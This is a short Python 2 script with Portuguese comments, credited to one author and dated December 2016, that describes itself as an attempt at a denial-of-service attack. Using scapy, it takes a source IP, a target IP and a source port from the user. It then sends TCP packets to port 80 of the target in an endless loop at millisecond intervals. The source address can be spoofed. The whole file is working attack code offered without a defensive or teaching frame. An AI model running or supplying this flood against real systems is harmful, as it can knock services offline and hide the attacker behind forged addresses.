#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo tenta
  fazer o ataque de DoS 

  Modificado em 26 de dezembro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importantando as bibliotecas necessárias
from scapy.all import *

src = raw_input("Digite o IP de origem ")
target = raw_input("Introduza o IP de destino ")
srcport = int(raw_input("Digite a porta de origem "))
i=1

while True: 
	IP1 = IP(src=src, dst=target)
	TCP1 = TCP(sport=srcport, dport=80) # Porta de envio é a 80
	pkt = IP1 / TCP1
	send(pkt,inter= .001)
	print "Pacote enviado ", i
	i=i+1










